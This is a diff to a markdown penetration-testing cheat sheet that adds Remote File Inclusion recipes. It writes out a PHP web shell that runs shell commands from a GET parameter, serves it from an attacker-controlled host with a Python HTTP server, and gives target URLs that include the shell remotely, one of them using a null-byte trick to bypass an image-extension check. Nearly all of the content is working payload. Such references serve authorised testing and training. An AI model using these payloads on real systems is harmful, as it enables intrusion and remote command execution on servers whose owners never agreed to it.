@@ -498,12 +498,22 @@ https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/word
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/posoning.txt  
 
 ## Remote File Inclusion (RFI)
+### RFI to Webshell with null byte for image extension bypass
 ```
 echo "<?php echo shell_exec($_GET['cmd']); ?>" > evil.txt
 python -m http.server 80
 ```
 ```
-http://site.com/menu.php?file=http://192.168.0.20/evil.txt&cmd=ipconfig
+http://site.com/menu.php?file=http://<IP>/evil.php%00.png
+```
+
+### RFI to Webshell with txt
+```
+echo '<?php echo shell_exec($_GET["cmd"]); ?>' > evil.txt
+python -m http.server 80
+```
+```
+http://site.com/menu.php?file=http://<IP>/evil.txt&cmd=ipconfig
 ```
 
 ## OS Command Injection
